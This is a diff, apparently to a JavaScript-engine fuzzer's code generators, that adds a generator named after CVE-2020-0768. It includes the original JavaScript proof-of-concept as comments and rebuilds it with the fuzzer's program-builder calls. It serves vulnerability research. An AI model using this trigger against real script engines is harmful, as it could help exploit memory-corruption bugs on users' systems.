@@ -12,6 +12,7 @@
 // See the License for the specific language governing permissions and
 // limitations under the License.
 
+
 //
 // Code generators.
 //
@@ -743,6 +744,41 @@ public func WasmPropertyRemovalGenerator(_ b: ProgramBuilder) {
     b.deleteProperty(propertyName, of: object)
 }
 
+
+
+
+public func CVE_2020_0768(_ b: ProgramBuilder){
+//    const v2 = undefined;
+//    let v4 = 0;
+//    while (v4 === v4) {
+//        if (v2) {
+//            const v9 = [1337];
+//            [v9];
+//        }
+//        const v11 = v4 + 1;
+//        v4 = v11;
+//    }
+    let v2 = b.const(b.loadUndefined())
+    let v4 = b.phi(b.loadInt(0))
+    b.whileLoop(v4, .strictEqual, v4) {
+        b.beginIf(v2) {
+            let v9 = b.createArray(with: [b.loadInt(1337)])
+            b.createArray(with: [v9])
+
+        }
+        b.beginElse {
+            b.beginIf(v2) {}
+            b.endIf()
+            
+        }
+        
+        b.endIf()
+        
+        let v11 = b.binary(v4, b.loadInt(1), with: .Add)
+        b.copy(v11, to: v4)
+    }
+
+}
 
 
 
